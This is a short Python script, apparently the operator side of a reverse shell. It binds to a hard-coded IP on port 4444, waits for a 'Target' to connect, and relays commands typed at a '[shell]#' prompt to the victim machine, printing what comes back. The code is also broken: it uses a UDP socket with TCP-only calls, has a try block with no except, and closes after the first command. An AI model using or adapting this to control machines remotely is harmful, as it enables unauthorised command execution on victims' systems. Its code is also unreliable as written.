


import socket ,sys

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
host = '103.181.69.19'#0.0.0.0
port = 4444

try :
    s.bind((host,port))

except socket.error as msg:
    print('bind failed .error:',msg)

s.listen(10)
print('lisenting .... \n')


conn,adddr = s.accept()
ip_target,port_target = adddr
print("Target =====>%s:%s\n"%(ip_target,port_target))


def exitFunc():
    conn.close()
    s.close()
    sys.exit()

while True:
    try:
        commend = input('\n[shell]#')
    if  commend  == 'exit':
        conn.send(b'%s'%str(commend).encode('utf-8'))
        print("\nGood by")
        exitFunc()
    elif commend == '':
        print('\n\nshell must have a commend')
    else :
        conn.send(b'%s'%str(commend).encode('utf-8'))
        data = str(conn.recv(1024),'utf-8')
        print("\n"+data)

    exitFunc()

  
print("/n"+data)
